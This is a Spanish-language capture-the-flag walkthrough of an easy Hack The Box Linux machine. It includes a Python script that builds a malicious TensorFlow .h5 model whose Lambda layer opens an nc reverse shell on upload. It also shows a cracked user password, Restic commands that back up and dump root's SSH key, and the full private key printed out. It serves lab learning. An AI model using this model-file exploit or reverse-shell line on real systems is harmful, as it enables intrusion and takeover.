

---
- Tags: #linux #easy 
---

empezamos con un escaneo de puertos para chequear cuales estan abiertos

```bash 
nmap -sS -p- --min-rate 5000 -vvv --open -n 10.10.11.74
```

donde tambien realizamos un escaneo para ver los servicios que corren para estos puertos

```bash 
nmap -sC -sV -p22,80 --min-rate 10000 10.10.11.74
```

![image-center](/assets/images/Pasted image 20250623152427.png)

agregamos el dominio al /etc/hosts

## Website / Port 80 

![image-center](/assets/images/{2FA69DF2-6217-41C9-ADEA-9DBFABF5029F}.png)

Al entrar en la web no veo nada interesante mas que un panel de `login` y registro. Asi que me registro 

![image-center](/assets/images/{5AFE1E90-584A-4363-9858-AEFD8368EB47}.png)

Al estar logueado veo una sección donde podemos subir archivos con la extensión `*.H5*` (el cual es un tipo de archivo en el que se guarda data en formato `JSON` mayormente).

![image-center](/assets/images/{3EAC54A6-DEF1-4CF9-83FD-D3A01D12667E}.png)

### TensorFlow file

Al investigar por archivos `.h5` malicioso veo este [enlace](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py). El mismo parece ser un PoC de una `Ejecucion remota de comandos (RCE)`, donde brinda un script en python3 con el siguiente contenido, el cual al ejecutarlo me deja un `.h5`.

```python
import tensorflow as tf
import os

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.17.19 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("model.h5")
```

Ahora ya puedo ejecutar el script en un entorno virtual el cual lo monte asi.

```bash
python3 -m venv venv 
```

```bash
source venv/bin/activate
```

```bash 
python3 poc.py          
2025-11-21 21:44:29.192010: I external/local_xla/xla/tsl/cuda/cudart_stub.cc:31] Could not find cuda drivers on your machine, GPU will not be used.
2025-11-21 21:44:29.222827: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-11-21 21:44:30.057386: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX512F AVX512_VNNI AVX512_BF16 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
2025-11-21 21:44:31.588798: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-11-21 21:44:31.589279: I external/local_xla/xla/tsl/cuda/cudart_stub.cc:31] Could not find cuda drivers on your machine, GPU will not be used.
(UNKNOWN) [10.10.17.19] 4444 (?) : Connection refused
2025-11-21 21:44:32.107196: E external/local_xla/xla/stream_executor/cuda/cuda_platform.cc:51] failed call to cuInit: INTERNAL: CUDA error: Failed call to cuInit: UNKNOWN ERROR (303)
WARNING:absl:You are saving your model as an HDF5 file via `model.save()` or `keras.saving.save_model(model)`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')` or `keras.saving.save_model(model, 'my_model.keras')`.
```

Ahora ya puedo subir el archivo `model` mientras nos ponemos en escucha desde nuestra maquina.

```bash 
 ls
model.h5  poc.py  venv
```

Una vez subido el archivo tocamos en `View predictions` para asi recibir nuestra shell

![image-center](/assets/images/{D980F1FA-1E02-409F-A3C0-AD941C5F4925}.png)

Y desde listener `nc` despues de unos segundos recibo la shell como root en un contenedor.

```bash
 nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.10.17.19] 50464
whoami
root
hostname -i 
127.0.1.1
```

nos movemos al directorio de la app 

```bash 
cd /home/app/instance
```

donde vamos a ver un archivo el cual parece ser una base de datos

este lo ejecutamos con sqlite3 para ver los datos que contiene:
```bash 
sqlite3 users.db 
```

```bash 
.tables
select * from users;
```


donde podemos ver varios usuarios, donde esta *Gael* que es el usuario no privilegiado de esta maquina. co nsu respectivo hash, el cual al crackearlo no da la siguyiente contraseña: **mattp005numbertwo**

Al acceder por ssh como el usuario gael podemos visualizar la flag

# Reconocimiento del User

enumerando todo el sistema como el usuario gael vemos que tiene corriendo 3 servicios como maquina host

```
netstat -tulpn 
```

![image-center](/assets/images/Pasted image 20250623154042.png)

En el puerto *5000*, *53* y *9898*

Volvemos a iniciar sesión por `ssh` haciendo un `Port forwarding` de estos puertos

```bash 
ssh gael@10.10.11.74 -L 5000:127.0.0.1:5000 -L 53:127.0.0.1:53 -L 9898:127.0.0.1:9898
```

al ver que es lo que hay en esto puertos vemos que es una pagina llamada **Backrest** la cual es una pagina web de backups y repositorios de **Restic**

pero para entrar debemos tener credenciales validas, al probar la de gael y los otros usuarios encontrados no encontramos nada

enumerando el sistema en el directorio */var/backups*, podemos ver un **backrest_backup.tar.gz**
el cual lo descomprimimos en el directorio */tmp* para ver su conteniodo , donde dentro de la ruta */tmp/backrest/.config/backrest/conf.json* podemos ver lo siguiente:

![image-center](/assets/images/Pasted image 20250623154743.png)

la cual parecen ser credenciales de *root* para la web de **Backrest**

al iniciar podemos ver una interfaz donde podemos subir o crear repositorios 

dentro de la maquina com gael creamos en el directorio */tmp/backrest* con el siguiente comando un repositorio, donde le ponemos una contraseña

```bash 
./restic init -r zsln 
```

![image-center](/assets/images/Pasted image 20250623155018.png)

posterior a crear este repo, podemos ver una interfaz para checkear, y purgar los repositorios y ademas un boton para ingresar comandos de *Restic* 

![image-center](/assets/images/Pasted image 20250623155149.png)

dentro de esta seccion podemos intentar realizar un backup de la clave rsa del usuario root


```bash 
backup -r zsln /root/.ssh/id_rsa

backup: para indicar que queremos realizar un backup de x archivo
-r: para indicarle el respositorio donde lo vamos a depositar
```
![image-center](/assets/images/Pasted image 20250623155501.png)
 como ven el input que ingresamos es valido
ahora procedemos a chequear el contenido con los siguientes comandos 

```bash 
-r zsln dump latest /root/.ssh/id_rsa
```

![image-center](/assets/images/Pasted image 20250623155629.png)

esta clave la metemos desde nuestra maquina en un archivo id_rsa

```bash 
echo "-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----" > id_rsa
```

le damos permisos de lectura 

```bash 
chmod 600 id_rsa 
```
 para luego ganar acceso como root 
```
ssh -i id_rsa root@artificial.htb 
```

![image-center](/assets/images/Pasted image 20250623155931.png)



